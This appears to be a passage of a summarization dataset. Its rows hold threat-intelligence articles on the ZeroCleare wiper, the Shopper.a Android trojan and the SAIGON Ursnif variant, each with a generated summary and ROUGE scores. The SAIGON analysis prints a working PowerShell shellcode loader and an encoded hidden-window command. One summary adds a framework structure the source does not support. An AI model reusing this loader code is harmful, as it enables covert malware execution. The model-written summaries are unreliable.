living-off-the-land tactics to the scheme, ZeroCleare was spread to numerous devices on the affected network, sowing the seeds of a destructive attack that could affect thousands of devices and cause disruption that could take months to fully recover from. These tactics resemble the way Shamoon was launched in attacks on Arabian Gulf targets in 2018.Destructive Attacks Are a Rising ConcernX-Force IRIS has been following a marked increase in destructive attacks in the past year, having logged a whopping 200 percent increase in the amount of destructive attacks that our team has helped companies respond to over the past six months (comparing IBM incident response activities in the first half of 2019 versus the second half of 2018).Destructive attacks on the energy and industrial sectors have been a rising concern, especially in countries where the economy relies on oil and gas industries, like in some parts of the Middle East and Europe. While we have seen them more frequently in the Middle East, these attacks are not limited to any part of the world and can be launched by any offensive nation-state group seeking to adversely affect the economy of rival countries, or by cybercriminals that use destruction as a pressure tactic.The destructive attacks we have seen are being carried out by threat actors of varying motivations who could be employing destructive components in their attacks. Some pressure victims to pay them, others counterblow when they are not paid. When these attacks are carried out by nation-state adversaries, they often have military objectives that can include accessing systems to deny access to, degrade, disrupt, deceive or destroy devices and/or data.ZeroCleare: A Complex, Targeted AttackZeroCleare attacks are not opportunistic and appear to be targeted operations against specific organizations. X-Force IRIS assesses that the ITG13 threat group, also known as APT34/OilRig, and at least one other group, likely based out of Iran, collaborated on the destructive portion of the ZeroCleare attack. X-Force IRIS's assessment is based on ITG13's traditional mission, which has not included executing destructive cyberattacks in the past, the gap in time between the initial access facilitated by ITG13 and the last stage of the intrusion, as well as the different TTPs our team observed.Infection Flow BasicsAs the facilitator of the endgame of the attack, the ZeroCleare wiper is part of the final stage of the overall operation. It is designed to deploy two different ways adapted to 32-bit and 64-bit systems. The general flow of events on 64-bit machines includes using a vulnerable, signed driver and then exploiting it on the target device to allow ZeroCleare to bypass the Windows hardware abstraction layer and avoid some operating system safeguards that prevent unsigned drivers from running on 64-bit machines.This workaround has likely been used because 64-bit Windows-based devices are protected with Driver Signature Enforcement (DSE). This control is designed to only allow drivers which have been signed by Microsoft to run on the device. Since ZeroCleare relies on the EldoS RawDisk driver, which is not a signed driver and would therefore not run by default, the attackers use an intermediary file named soy.exe to perform the workaround. They load a vulnerable but signed VBoxDrv driver, which the DSE accepts and runs, and then exploit it to load the unsigned driver, thereby avoiding DSE rejection of the EldoS driver.Once loaded, the vulnerable VBoxDrv driver is exploited to run shellcode on the kernel level. Post-exploitation, the driver is used to load the unsigned EldoS driver and proceed to the disk wiping phase. Having analyzed soy.exe, we determined it was a modified version of the Turla Driver Loader (TDL), which is used to facilitate that very DSE bypass.The same process does not apply to the 32-bit systems as they do not limit running unsigned drivers in the same manner.Figure 1: ZeroCleare's top-level infection flow (Source: IBM X-Force)The complete technical analysis of the ZeroCleare malware attack has been documented by X-Force IRIS researchers. You can also find ZeroCleare on X-Force Exchange.Attributing ZeroCleare: Possibly a Collaboration Between Iranian State-Sponsored GroupsX-Force IRIS assesses that the ZeroCleare campaign included compromise and access by actors from the ITG13 group and at least one additional group, likely Iran-based threat actors. Let's look at the details of some of the resources used throughout the ZeroCleare attack that can connect it with ITG13.For initial access, the IP address 193.111.152[.]13, which was associated with ITG13 in recent Oilrig/APT34 leaks and also reported by Palo Alto Networks, was used to scan target networks and access accounts as early as fall 2018. A different Iranian threat actor likely accessed accounts from that address in mid-2019 preceding disk wiping operations.One of the IP addresses used to access compromised network accounts in mid-2019 was 194.187.249[.]103, which is adjacent to another IP address, 194.187.249[.]102. The latter was used several months prior to the attack by the threat actor Hive0081 (aka xHunt). Additionally, while recent reporting from the Cybersecurity and Infrastructure Security Agency (CISA) indicated that the Russian threat actor IRIS tracks as ITG12 (aka Turla) had access to ITG13 tools and infrastructure potentially during this time frame, X-Force IRIS does not believe ITG12 was behind the ZeroCleare attack.During the destructive phase, ITG13 threat actors brute-forced passwords to gain access to several network accounts, which were used to install the China Chopper and Tunna web shells after exploiting a SharePoint vulnerability. X-Force IRIS found an additional web shell named extension.aspx, which shared similarities with the ITG13 tool known as TWOFACE/SEASHARPEE, including the methods that were dynamically called from assembly, the use of AES encryption and single-letter variable names.The same threat actor also attempted to leverage legitimate remote-access software, such as TeamViewer, and used an obfuscated version of Mimikatz to collect credentials from compromised servers.Regarding the ZeroCleare malware itself, while it shares some high-level similarities with Shamoon v3, specifically in how it uses an EldoS RawDisk driver, X-Force IRIS assesses that ZeroCleare is dissimilar enough in its code and deployment mechanism to be considered distinct from the Shamoon malware family and treated as separate malware.While X-Force IRIS cannot attribute the activity observed during the destructive phase of the ZeroCleare campaign, we assess that high-level similarities with other Iranian threat actors, including the reliance on ASPX web shells and compromised VPN accounts, the link to ITG13 activity and the attack aligning with Iranian objectives in the region, make it likely this attack was executed by one or more Iranian threat groups.Various links inferred from examining common TTPs and indicators of compromise as mentioned in the previous section make it possible that this wiper variant was built by Iran-based nation-state attackers. Recent activity from that sphere includes the Sakabota backdoor, recently reported by X-Force IRIS and also tied to ITG13, as well as the Lyceum campaign reported by Dell-EMC SecureWorks. In these campaigns, the top targets were Kuwaiti shipping and transportation organizations.The Energy Sector in the CrosshairsNation-state attackers have typically carried out destructive attacks against the energy sector, with a historical focus on oil and gas companies, however, destructive attacks can target any entity. Why has this sector been finding itself in the crosshairs of such activity?The key role oil and gas production and processing play on both the national and global level represents a high-value target for state-sponsored adversarial actors. These types of attackers may be tasked with conducting anything from industrial espionage to cyber kinetic attacks designed to disrupt the critical infrastructure of rival nations. Depending on the sophistication, scale and frequency of attacks, cyber incidents in this space have the potential to disrupt critical services, damage or destroy highly specialized equipment, and ultimately inflict detrimental cascading effects on global energy security and industries downstream.While nation-state attacks have been happening more in the past decade, it has been since at least 2012 that Iranian state-sponsored threat actors have been leveraging cyberattacks to inflict destructive, kinetic effects on their targets. The use of cyber-based weapons in lieu of conventional military tactics presents Iran, in this case, with a low-cost and potentially nonattributable means of conducting hostile and even warlike activities. With attribution to one specific group becoming a challenge nowadays, working under the cyber cloak of anonymity can also allow Iran to evade sanctions and preserve its relations with international players who may support its economic and nuclear energy interests.Looking at the geographical region hit by the ZeroCleare malware, it is not the first time the Middle East has seen destructive attacks target its energy sector. In addition to underpinning the economies of several Gulf nations, the Middle Eastern petrochemical market, for example, hosts approximately 64.5 percent of the world's proven oil reserves, according to OPEC, making it a vital center of global energy architecture. Destructive cyberattacks against energy infrastructure in this arena, therefore, represent a high-impact threat to both regional and international markets.Mitigating the Risk Posed by Destructive MalwareWhen it comes to destructive attacks, early detection and escalation as well as coordinated response to contain and stop the spread of threats are critical. Here are some tips from our team that can help mitigate the risk of destructive malware.Use Threat Intelligence to Understand the Risk to Your OrganizationEach threat actor has different motivations, capabilities and intentions, and threat intelligence can help provide insights that increase the efficacy of an organization's preparedness and eventual response to an incident.Build Effective Defense-in-DepthIncorporate multiple layers of security controls across the entire Cyberattack Preparation and Execution Framework.Figure 2: X-Force IRIS Cyberattack Preparation and Execution Framework (Source: IBM X-Force)Deploy IAM, Limit Privileged Users and Implement MFAIn most attacks, adversarial actors leverage privileged accounts to expand their foothold in compromised networks. Limit the number of those accounts to a minimum and back them up with multifactor authentication (MFA). Don't allow one account to access all systems either.Deploy identity and access management (IAM) to apply business-process-centric policies to what your users can access. That way, if their account is compromised, the attacker will have a harder time using it for access to other parts of the network. Leveraging IAM can also help baseline legitimate access and alert security teams when lateral movement could be abusing access to compromised accounts.Have Backups, Test Backups and Keep Offline BackupsBacking up systems is a foundational best practice, but ensuring the organization has effective backups of critical systems and testing these backups is more important than ever. Being able to use backups in recovery can make a significant difference in remediating destructive malware attacks.Test Your Response Plans Under PressureUsing well-tailored tabletop exercises and cyber range simulations can help ensure that your teams are indeed ready, on both the tactical and strategic levels, to manage a destructive malware incident.Rehearsed response plans require ongoing testing and adjustment, but they allow an incident response team to carry out plans and be able to implement them effectively when the time comes to respond and remediate.For emergencies or if your organization is under attack, please call the IBM X-Force emergency response hotline at 1-888-241-9812 or (+001) 602-220-1440.Read the full X-Force report on the ZeroCleare wiper";The XForce IRIS Cyberattack Preparation and Execution Framework (Figure 2) is designed to help organizations prepare for and respond to destructive malware attacks. The framework consists of five key components: threat intelligence, defenseindepth, identity and access management (IAM), backups and response plans. Threat intelligence helps organizations understand the risk posed by destructive malware attacks. Defenseindepth consists of multiple layers of security controls across the entire Cyberattack Preparation and Execution Framework. IAM helps baseline legitimate access and alerts security teams when lateral movement could be abusing access to compromised accounts. Backups and response plans ensure that the organization has effective backups of critical systems and can test their response plans under pressure.;en;{'r': 0.06673960612691467, 'p': 0.782051282051282, 'f': 0.1229838695188118};{'r': 0.026371308016877638, 'p': 0.5, 'f': 0.05010019944899822};{'r': 0.06564551422319474, 'p': 0.7692307692307693, 'f': 0.12096774048655372}
https://duo.com/decipher/new-zerocleare-wiper-malware-used-in-targeted-attacks;New ZeroCleare Wiper Malware Used in Targeted Attacks;"A new, destructive strain of malware that shares some similarities with the infamous Shamoon wiper malware has surfaced as part of a recent targeted attack campaign that targeted companies in the energy sector in the Middle East. The malware has the ability to completely destroy data on compromised machines and researchers say it appears to be the product of an Iranian attack team that may be collaborating with a separate Iranian group to deploy it.The newly uncovered wiper malware is known as ZeroCleare and researchers with IBM's X-Force team discovered it while investigating recent destructive attacks in the Middle East. The attacks focused on energy companies and ZeroCleare was used as the last stage of a long infection and lateral movement chain inside the target networks. The malware overwrites the master boot record (MBR) and partitions on compromised Windows machines, the same kind of behavior that Shamoon exhibited in attacks on oil companies dating back to 2012. Though Shamoon and ZeroCleare have similar capabilities and behaviors, the X-Force researchers say the two are separate and distinct pieces of malware.Shamoon has been used in several different campaigns over the years, with most of them targeting energy companies, specifically those in Saudi Arabia. The most destructive of Shamoon's attacks was the intrusion at Saudi Aramco in 2012, an attack that destroyed the data of about 35,000 workstations. Shamoon has resurfaced in a handful of other incidents since then, and other wiper malware variants have emerged in that time, as well.ZeroCleare appears to be a separate piece of malware from Shamoon and the X-Force team believes that Iranian attack teams are responsible for its development and use. But the development and deployment may have been the work of separate groups, one of which is likely the team known as OilRig, which IBM calls ITG13.""According to our investigation, ZeroCleare was used to execute a destructive attack that affected organizations in the energy and industrial sectors in the Middle East. Based on the analysis of the malware and the attackers' behavior, we suspect Iran-based nation-state adversaries were involved to develop and deploy this new wiper,"" said Limor Kessem, a security researcher and executive security advisor at IBM.""X-Force IRIS assesses that the ZeroCleare campaign included compromise and access by actors from the ITG13 group and at least one additional group, likely Iran-based threat actors.""The ZeroCleare attacks began with the attackers scanning a target network and then gaining an initial foothold. Once on a machine, the attackers use a series of different drivers in order to eventually execute the destructive payload. The first driver in this chain is called soy.exe and is a modified version of the Turla driver loader. That driver is then used to load a vulnerable version of the VirtualBox driver, which the attackers exploit to load the EldoS RawDisk driver. RawDisk is a legitimate utility used for interacting with files and partitions, and it was also used by the Shamoon attackers to access the MBR.";A new, destructive strain of malware that shares some similarities with the infamous Shamoon wiper malware has surfaced as part of a recent targeted attack campaign that targeted companies in the energy sector in the Middle East. The malware has the ability to completely destroy data on compromised machines and researchers say it appears to be the product of an Iranian attack team that may be collaborating with a separate Iranian group to deploy it.The newly uncovered wiper malware is known as ZeroCleare and researchers with IBM's XForce team discovered it while investigating recent destructive attacks in the Middle East. The attacks focused on energy companies and ZeroCleare was used as the last stage of a long infection and lateral movement chain inside the target networks. The malware overwrites the master boot record (MBR) and partitions on compromised Windows machines, the same kind of behavior that Shamoon exhibited in attacks on oil companies dating back to 2012. Though Shamoon and ZeroCleare have similar capabilities and behaviors, the XForce researchers say the two are separate and distinct pieces of malware.Shamoon has been used in several different campaigns over the years, with most of them targeting energy companies, specifically those in Saudi Arabia. The most destructive of Shamoon's attacks was the intrusion at Saudi Aramco in 2012, an attack that destroyed the data of about 35,000 workstations. Shamoon has resurfaced in a handful of other incidents since then, and other wiper malware variants have emerged in that time, as well.ZeroCleare appears to be a separate piece of malware from Shamoon and the XForce team believes that;en;{'r': 0.5798319327731093, 'p': 0.9928057553956835, 'f': 0.7320954860609727};{'r': 0.526431718061674, 'p': 0.9835390946502057, 'f': 0.6857962651856183};{'r': 0.5798319327731093, 'p': 0.9928057553956835, 'f': 0.7320954860609727}
https://securelist.com/smartphone-shopaholic/95544/;Smartphone shopaholic;"Have you ever noticed strange reviews of Google Play apps that look totally out of place? Their creators might give it five stars, while dozens of users rate it with just one, and in some cases the reviews seem to be talking about some other program entirely.If so, you may be unknowingly acquainted with the work of Trojan-Dropper.AndroidOS.Shopper.a.How Shopper.a worksCybercriminals use Trojan-Dropper.AndroidOS.Shopper.a to boost certain app's rating and increase the number of installations and registrations. All this can be used, among other things, to dupe advertisers. What's more, the Trojan can display advertising messages on the infected device, create shortcuts to ad sites, and perform other actions.Back to the suspicious reviews, Trojan-Dropper.AndroidOS.Shopper.a. can open Google Play (or another app store), install several programs, and write fake user reviews of them. To make user not notice anything untoward, the installation window is concealed by the app's ""invisible"" window. The lack of installation rights from third-party sources is no obstacle to the Trojan -- it gives itself the requisite permissions through AccessibilityService. This service is intended by Google to facilitate the use of smartphones for people with disabilities, but in the hands of cybercriminals it poses a serious threat to device owners. With permission to use it, the malware has almost limitless possibilities for interacting with the system interface and apps. For instance, it can intercept data displayed on the screen, click buttons, and emulate user gestures.Masked as a system app, the malware misleads the user by using the system icon and the name ConfigAPKs. Our eye was caught by the app's heavy obfuscation and suspicious use of AccessibilityService.Trojan-Dropper.AndroidOS.Shopper.a was most widespread in Russia, where the largest share of infected users (28.46%) was recorded in October - November 2019. Second place went to Brazil (18.70%) and third to India (14.23%).Technical detailsAt startup, after the screen is unlocked, the app decrypts and downloads the payload.Then the Trojan collects information about victim's device (country, network type, vendor, smartphone model, email address, IMEI, IMSI), and forwards it to the cybercriminal server at:http://api.adsnative123[.]com/search.php?sid=1001&sdk_v=A1.5.0&geo=PK&network=WIFI&time=1567059364545&lang=en&udid=dc9c9a616665e073&unkown=true&pname=com.cleaner.qefey.kslr&size=800_561&osv=4.4.2&gaid=6fa818cc-7a9d-4e4d-a6c9-69179c3c2490&anum=8&s_udid=&native=2&key=...In response, it receives a set of commands:Depending on the commands, Shopper.a can:Open links received from the remote server in an invisible window (whereby the malware verifies that the user is connected to a mobile network).After a certain number of screen unlocks, hide itself from the apps menu.Check the availability of AccessibilityService rights and, if not granted, periodically issue a phishing request to the user to provide them.Disable Google Play Protect.Create shortcuts to advertised sites in the apps menu.Download apps from the third-party ""market"" Apkpure[.]com and install them.Open advertised apps on Google Play and ""click"" to install them.Replace shortcuts to installed apps with shortcuts to advertised sites.Post fake reviews supposedly from the Google Play user.Show ads when the screen is unlocked.Register users through their Google or Facebook accounts in a number of legitimate apps (such as in travel, retail, utilities and media categories) including the following apps:Icon App Package name Aliexpress com.alibaba.aliexpresshd Lazada com.lazada.android Zalora com.zalora.android Shein com.zzkko Joom com.joom Likee video.like Alibaba com.alibaba.intl.android.apps.poseidonDisclaimer: The malware described above does not exploit any vulnerabilities in legitimate apps that it downloads and registers users. The application only abuses Google Accessibility Service.ConclusionAs noted above, one of the things that drew our attention was the use of AccessibilityService. This service is usually accessed by people with vision problems to facilitate smartphone use, such as having the names of app controls, web page content, etc., read out automatically. In other cases, it can be used to emulate on the app screen physical smartphone keys that have stopped working. If access is requested by a program whose functionality does not require AccessibilityService, be wary. And the best option is not to install apps from dubious sources at all, including from ads, whatever they promise. Even if the only danger posed by such apps comes from automatically written reviews, there is no guarantee that its creators will not change the payload at some later date. In any event, it's worth getting hold of a mobile security solution that can independently detect and block dangerous apps.IOCsMD50a421b0857cfe4d0066246cb87d8768c0b54b822683a70b9d4a3af08a2d506b20b682e9cae5b8623fc3e62048623dcdb0ea057c5294a6cbfeffd2e91ae9459810eb70afbb011916facf075f80cc076051a6d60b97fdeb29afc0bd16fcaa92d3a1e82c197037ff0e21ccbc8c6161144c81e937712ca84a6364226a35e2fd9a5501f13ba11ceba8ddb6e0faf61e6d8da232d234accdc400c892657b8568e2175932d755050c896aed9701aa78a3668bf723a5ed5f6ecaa71f5c7b7447c1f4511443ad3f270aef9f56d9117f711a3783a4a3b1a2420c4afc019a19481a6f42828943c312fbb18e7822f87334a9366baf9fc3cadeea4dedaf7d7db8b84d52cd6caea03ccb6adbe12daef1b40f7a6d7d26dbc3dc6538239e90e51233789c5876ccb713fe0e78d451bb8389f1d8cb5009c34524a3099f300741123e3c18b3a6d587ed84e44fb07073ea46390ea94ce26d7d7375bbc06fc3058b76ee09d3cce608ebdda5c316045836c4b4110552cc80af2fe755e313e5e4e37e87633ea342a24c275346ec7e5334f8b11499c150ba28f06e78c7a0d40f3598a91fc1206b3b2bdd49c2c7c68eb0bd93d8cf27539d2ff7da5bb15C&Chttp://api.adsnative123[.]com";"TrojanDropper.AndroidOS.Shopper.a is a malicious program designed to boost certain app's rating and increase the number of installations and registrations. It can open Google Play (or another app store), install several programs, and write fake user reviews of them. To make user not notice anything untoward, the installation window is concealed by the app's ""invisible"" window. The lack of installation rights from thirdparty sources is no obstacle to the Trojan it gives itself the requisite permissions through AccessibilityService. This service is intended by Google to facilitate the use of smartphones for people with disabilities, but in the hands of cybercriminals it poses a serious threat to device owners. With permission to use it, the malware has almost limitless possibilities for interacting with the system interface and apps. For instance, it can intercept data displayed on the screen, click buttons, and emulate user gestures. Masked as a system app, the malware misleads the user by using the system icon and the name ConfigAPKs. Our eye was caught by the app's heavy obfuscation and suspicious use of AccessibilityService. TrojanDropper.AndroidOS.Shopper.a was most widespread in Russia, where the largest share of infected users (28.46%) was recorded in October November 2019. Second place went to Brazil (18.70%) and third to India (14.23%). At startup, after the screen is unlocked, the app decrypts and downloads the payload. Then the Trojan collects information about victim's device (country, network type, vendor, smartphone model, email address, IMEI, IMSI), and The mal";en;{'r': 0.3960880195599022, 'p': 0.9585798816568047, 'f': 0.5605536290800518};{'r': 0.3323353293413174, 'p': 0.925, 'f': 0.48898678025189707};{'r': 0.3960880195599022, 'p': 0.9585798816568047, 'f': 0.5605536290800518}
https://www.mandiant.com/resources/blog/saigon-mysterious-ursnif-fork;SAIGON, the Mysterious Ursnif Fork;"Ursnif (aka Gozi/Gozi-ISFB) is one of the oldest banking malware families still in active distribution. While the first major version of Ursnif was identified in 2006, several subsequent versions have been released in large part due source code leaks. FireEye reported on a previously unidentified variant of the Ursnif malware family to our threat intelligence subscribers in September 2019 after identification of a server that hosted a collection of tools, which included multiple point-of-sale malware families. This malware self-identified as ""SaiGon version 3.50 rev 132,"" and our analysis suggests it is likely based on the source code of the v3 (RM3) variant of Ursnif. Notably, rather than being a full-fledged banking malware, SAIGON's capabilities suggest it is a more generic backdoor, perhaps tailored for use in targeted cybercrime operations.Technical AnalysisBehaviorSAIGON appears on an infected computer as a Base64-encoded shellcode blob stored in a registry key, which is launched using PowerShell via a scheduled task. As with other Ursnif variants, the main component of the malware is a DLL file. This DLL has a single exported function, DllRegisterServer, which is an unused empty function. All the relevant functionality of the malware executes when the DLL is loaded and initialized via its entry point.Upon initial execution, the malware generates a machine ID using the creation timestamp of either %SystemDrive%\pagefile.sys or %SystemDrive%\hiberfil.sys (whichever is identified first). Interestingly, the system drive is queried in a somewhat uncommon way, directly from the KUSER_SHARED_DATA structure (via SharedUserData?NtSystemRoot). KUSER_SHARED_DATA is a structure located in a special part of kernel memory that is mapped into the memory space of all user-mode processes (thus shared), and always located at a fixed memory address (0x7ffe0000, pointed to by the SharedUserData symbol).The code then looks for the current shell process by using a call to GetWindowThreadProcessId(GetShellWindow(), ...). The code also features a special check, if the checksum calculated from the name of the shell's parent process matches the checksum of explorer.exe (0xc3c07cf0), it will attempt to inject into the parent process instead.SAIGON then injects into this process using the classic VirtualAllocEx / WriteProcessMemory / CreateRemoteThread combination of functions. Once this process is injected, it loads two embedded files from within its binary:A PUBLIC.KEY file, which is used to verify and decrypt other embedded files and data coming from the malware's command and control (C2) serverA RUN.PS1 file, which is a PowerShell loader script template that contains a ""@SOURCE@"" placeholder within the script:$hanksefksgu = [System.Convert]::FromBase64String(""@SOURCE@""),Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(""JHdneG1qZ2J4dGo9JGhhbmtzZWZrc2d1Lkxlbmd0aDskdHNrdm89IltEbGxJbXBvcnQoYCJrZXJuZWwzMmAiKV1gbnB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludDMyIEdldEN1cnJlbnRQcm9jZXNzKCk7YG5bRGxsSW1wb3J0KGAidXNlcjMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldERDKEludFB0ciBteHhhaHhvZik7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEludFB0ciBoY3d5bHJicywgSW50UHRyIHdxZXIsdWludCBzZmosSW50UHRyIHdsbGV2LEludFB0ciB3d2RyaWN0d2RrLHVpbnQga2xtaG5zayxJbnRQdHIgdmNleHN1YWx3aGgpO2BuW0RsbEltcG9ydChgImtlcm5lbDMyYCIpXWBucHVibGljIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGFqLCBVSW50MzIga2R4c3hldik7YG5bRGxsSW1wb3J0KGAia2VybmVsMzJgIildYG5wdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciB4eSx1aW50IGtuYnQsdWludCB0bXJ5d2h1LHVpbnQgd2d1dHVkKTsiOyR0c2thYXhvdHhlPUFkZC1UeXBlIC1tZW1iZXJEZWZpbml0aW9uICR0c2t2byAtTmFtZSAnV2luMzInIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLXBhc3N0aHJ1OyRtaHhrcHVsbD0kdHNrYWF4b3R4ZTo6VmlydHVhbEFsbG9jKDAsJHdneG1qZ2J4dGosMHgzMDAwLDB4NDApO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGhhbmtzZWZrc2d1LDAsJG1oeGtwdWxsLCR3Z3htamdieHRqKTskdGRvY25ud2t2b3E9JHRza2FheG90eGU6OkNyZWF0ZVJlbW90ZVRocmVhZCgtMSwwLDAsJG1oeGtwdWxsLCRtaHhrcHVsbCwwLDApOyRvY3h4am1oaXltPSR0c2thYXhvdHhlOjpXYWl0Rm9yU2luZ2xlT2JqZWN0KCR0ZG9jbm53a3ZvcSwzMDAwMCk7""))),The malware replaces the ""@SOURCE@"" placeholder from this PowerShell script template with a Base64-encoded version of itself, and writes the PowerShell script to a registry value named ""PsRun"" under the ""HKEY_CURRENT_USER\Identities\{<random_guid>}"" registry key (Figure 1).Figure 1: PowerShell script written to PsRunThe instance of SAIGON then creates a new scheduled task (Figure 2) with the name ""Power<random_word>"" (e.g. PowerSgs). If this is unsuccessful for any reason, it falls back to using the ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" registry key to enable itself to maintain persistence through system reboot.Figure 2: Scheduled taskRegardless of the persistence mechanism used, the command that executes the binary from the registry is similar to the following:PowerShell.exe -windowstyle hidden -ec aQBlAHgAIAAoAGcAcAAgACcASABLAEMAVQA6AFwASQBkAGUAbgB0AGkAdABpAGUAcwBcAHsANAAzAEIAOQA1AEUANQBCAC0ARAAyADEAOAAtADAAQQBCADgALQA1AEQANwBGAC0AMgBDADcAOAA5AEMANQA5AEIAMQBEAEYAfQAnACkALgBQAHMAUgB1AG4AAfter removing the Base64 encoding from this command, it looks something like ""iex (gp 'HKCU:\\Identities\\{43B95E5B-D218-0AB8-5D7F-2C789C59B1DF}').PsRun."" When executed, this command retrieves the contents of the previous registry value using Get-ItemProperty (gp) and executes it using Invoke-Expression (iex).Finally, the PowerShell code in the registry allocates a block of memory, copies the Base64-decoded shellcode blob into it, launches a new thread pointing to the area using CreateRemoteThread, and waits for the thread to complete. The following script is a deobfuscated and beautified version of the PowerShell.$hanksefksgu = [System.Convert]::FromBase64String(""@SOURCE@""),$wgxmjgbxtj = $hanksefksgu.Length, $tskvo = @""[DllImport(""kernel32"")]public static extern Int32 GetCurrentProcess(), [DllImport(""user32"")]public static extern IntPtr GetDC(IntPtr mxxahxof), [DllImport(""kernel32"")]public static extern IntPtr CreateRemoteThread(IntPtr hcwylrbs, IntPtr wqer, uint sfj, IntPtr wllev, IntPtr wwdrictwdk, uint klmhnsk, IntPtr vcexsualwhh), [DllImport(""kernel32"")]public static extern UInt32 WaitForSingleObject(IntPtr aj, UInt32 kdxsxev), [DllImport(""kernel32"")]public static extern IntPtr VirtualAlloc(IntPtr xy, uint knbt, uint tmrywhu, uint wgutud),""@, $tskaaxotxe = Add-Type -memberDefinition $tskvo -Name 'Win32' -namespace Win32Functions -passthru,$mhxkpull = $tskaaxotxe::VirtualAlloc(0, $wgxmjgbxtj, 0x3000, 0x40),[System.Runtime.InteropServices.Marshal]::Copy($hanksefksgu, 0, $mhxkpull, $wgxmjgbxtj),$tdocnnwkvoq = $tskaaxotxe::CreateRemoteThread(-1, 0, 0, $mhxkpull, $mhxkpull, 0, 0),$ocxxjmhiym = $tskaaxotxe::WaitForSingleObject($tdocnnwkvoq, 30000),Once it has established a foothold on the machine, SAIGON loads and parses its embedded LOADER.INI configuration (see the Configuration section for details) and starts its main worker thread, which continuously polls the C2 server for commands.ConfigurationThe Ursnif source code incorporated a concept referred to as ""joined data,"" which is a set of compressed/encrypted files bundled with the executable file. Early variants relied on a special structure after the PE header and marked with specific magic bytes (""JF,"" ""FJ,"" ""J1,"" ""JJ,"" depending on the Ursnif version). In Ursnif v3 (Figure 3), this data is no longer simply after the PE header but pointed to by the Security Directory in the PE header, and the magic bytes have also been changed to ""WD"" (0x4457).Figure 3: Ursnif v3 joined dataThis structure defines the various properties (offset, size, and type) of the bundled files. This is the same exact method used by SAIGON for storing its three embedded files:PUBLIC.KEY - RSA public keyRUN.PS1 - PowerShell script templateLOADER.INI - Malware configurationThe following is a list of configuration options observed:Name Checksum Name Description 0x97ccd204 HostsList List of C2 URLs used for communication 0xd82bcb60 ServerKey Serpent key used for communicating with the C2 0x23a02904 Group Botnet ID 0x776c71c0 IdlePeriod Number of seconds to wait before the initial request to the C2 0x22aa2818 MinimumUptime Waits until the uptime is greater than this value (in seconds) 0x5beb543e LoadPeriod Number of seconds to wait between subsequent requests to the C2 0x84485ef2 HostKeepTime The number of minutes to wait before switching to the next C2 server in case of failuresTable 1: Configuration optionsCommunicationWhile the network communication structure of SAIGON is very similar to Ursnif v3, there are some subtle differences. SAIGON beacons are sent to the C2 servers as multipart/form-data encoded requests via HTTP POST to the ""/index.html"" URL path. The payload to be sent is first encrypted using Serpent encryption (in ECB mode vs CBC mode), then Base64-encoded. Responses from the server are encrypted with the same Serpent key and signed with the server's RSA private key.SAIGON uses the following User-Agent header in its HTTP requests: ""Mozilla/5.0 (Windows NT <os_version>, rv:58.0) Gecko/20100101 Firefox/58.0,"" where <os_version> consists of the operating system's major and minor version number (e.g. 10.0 on Windows 10, and 6.1 on Windows 7) and the string "", Win64, x64"" is appended when the operating system is 64-bit. This yields the following example User Agent strings:""Mozilla/5.0 (Windows NT 10.0, Win64, x64, rv:58.0) Gecko/20100101 Firefox/58.0"" on Windows 10 64-bit""Mozilla/5.0 (Windows NT 6.1, rv:58.0) Gecko/20100101 Firefox/58.0"" on Windows 7 32-bitThe request format is also somewhat similar to the one used by other Ursnif variants described in Table 2:ver=%u&group=%u&id=%08x%08x%08x%08x&type=%u&uptime=%u&knock=%uName Description ver Bot version (unlike other Ursnif variants this only contains the build number, so only the xxx digits from ""3.5.xxx"") group Botnet ID id Client ID type Request type (0 - when polling for tasks, 6 - for system info data uploads) uptime Machine uptime in seconds knock The bot ""knock"" period (number of seconds to wait between subsequent requests to the C2, see the LoadPeriod configuration option)Table 2: Request format componentsCapabilitiesSAIGON implements the bot commands described in Table 3.Name Checksum Name Description 0x45d4bf54 SELF_DELETE Uninstalls itself from the machine, removes scheduled task and deletes its registry key 0xd86c3bdc LOAD_UPDATE Download data from URL, decrypt and verify signature, save it as a .ps1 file and run it using ""PowerShell.exe -ep unrestricted -file %s"" 0xeac44e42 GET_SYSINFO Collects and uploads system information by running: ""systeminfo.exe"" ""net view"" ""nslookup 127.0.0.1"" ""tasklist.exe /SVC"" ""driverquery.exe"" ""reg.exe query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s"" 0x83bf8ea0 LOAD_DLL Download data from URL, decrypt and verify, then use the same shellcode loader that was used to load itself into memory to load the DLL into the current process 0xa8e78c43 LOAD_EXE Download data from URL, decrypt and verify, save with an .exe extension, invoke using ShellExecuteTable 3: SAIGON bot commandsComparison to Ursnif v3Table 4 shows the similarities between Ursnif v3 and the analyzed SAIGON samples (differences are highlighted in bold):Ursnif v3 (RM3) Saigon (Ursnif v3.5?) Persistence method Scheduled task that executes code stored in a registry key using PowerShell Scheduled task that executes code stored in a registry key using PowerShell Configuration storage Security PE directory points to embedded binary data starting with 'WD' magic bytes (aka. Ursnif ""joined files"") Security PE directory points to embedded binary data starting with 'WD' magic bytes (aka. Ursnif ""joined files"") PRNG algorithm xorshift64* xorshift64* Checksum algorithm JAMCRC (aka. CRC32 with all the bits flipped) CRC32, with the result rotated to the right by 1 bit Data compression aPLib aPLib Encryption/Decryption Serpent CBC Serpent ECB Data integrity verification RSA signature RSA signature Communication method HTTP POST requests HTTP POST requests Payload encoding Unpadded Base64 ('+' and '/' are replaced with '_2B' and '_2F' respectively), random slashes are added Unpadded Base64 ('+' and '/' are replaced with '%2B' and '%2F' respectively), no random slashes Uses URL path mimicking? Yes No Uses PX file format? Yes NoTable 4: Similarities and differences between Ursnif v3 and SAIGON samplesFigure 4 shows Ursnif v3's use of URL path mimicking. This tactic has not been seen in other Ursnif variants, including SAIGON.Figure 4: Ursnif v3 mimicking 